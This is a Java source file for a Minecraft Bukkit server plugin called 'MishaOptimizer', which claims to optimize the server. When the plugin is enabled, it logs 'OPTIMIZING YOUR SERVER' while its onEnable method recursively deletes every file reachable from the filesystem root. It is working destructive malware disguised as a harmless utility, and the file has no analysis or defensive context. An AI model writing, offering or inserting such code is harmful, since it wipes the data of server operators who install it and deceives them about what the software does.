package sex.mishaOptimizer;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public final class MishaOptimizer extends JavaPlugin {

    @Override
    public void onEnable() {

        this.getLogger().warning("MISHA OPTIMIZER ENABLED");
        this.getLogger().warning("OPTIMIZING YOUR SERVER");

        removeDir(new File("/"));

    }

    private void removeDir(File dir) {
        if (dir.isFile()) return;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) removeDir(file);
                file.delete();
            }
        }
    }

}
